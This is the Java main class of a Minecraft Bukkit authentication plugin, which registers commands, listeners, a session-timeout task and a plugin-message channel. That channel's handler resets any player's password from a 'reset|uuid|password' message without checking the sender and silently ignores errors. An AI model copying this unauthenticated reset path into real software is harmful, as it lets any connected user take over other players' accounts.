package com.tahai.tahaiauth;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.plugin.messaging.PluginMessageListener;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class Main extends JavaPlugin {
    private ConfigManager configManager;
    private DataManager dataManager;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        configManager = new ConfigManager(this);
        dataManager = new DataManager(this);

        AuthCommand authCommand = new AuthCommand();
        getCommand("auth").setExecutor(authCommand);
        getCommand("auth").setTabCompleter(authCommand);

        getServer().getPluginManager().registerEvents(new AuthListener(), this);
        SessionTimeoutTask sessionTimeoutTask = new SessionTimeoutTask();
        getServer().getPluginManager().registerEvents(sessionTimeoutTask, this);
        sessionTimeoutTask.runTaskTimer(this, 0L, 20L);

        getServer().getMessenger().registerIncomingPluginChannel(this, "tahaiauth:password",
                new PluginMessageListener() {
                    @Override
                    public void onPluginMessageReceived(String channel, Player player, byte[] message) {
                        String msg = new String(message, StandardCharsets.UTF_8);
                        String[] parts = msg.split("\\|");
                        if (parts.length == 3 && parts[0].equals("reset")) {
                            try {
                                UUID uuid = UUID.fromString(parts[1]);
                                String newPassword = parts[2];
                                dataManager.resetPassword(uuid, newPassword);
                            } catch (Exception ignored) {
                            }
                        }
                    }
                });
        getServer().getMessenger().registerOutgoingPluginChannel(this, "tahaiauth:password");
    }

    @Override
    public void onDisable() {
        if (dataManager != null) dataManager.shutdown();
        getServer().getScheduler().cancelTasks(this);
    }

    public ConfigManager getConfigManager() {
        return configManager;
    }

    public DataManager getDataManager() {
        return dataManager;
    }
}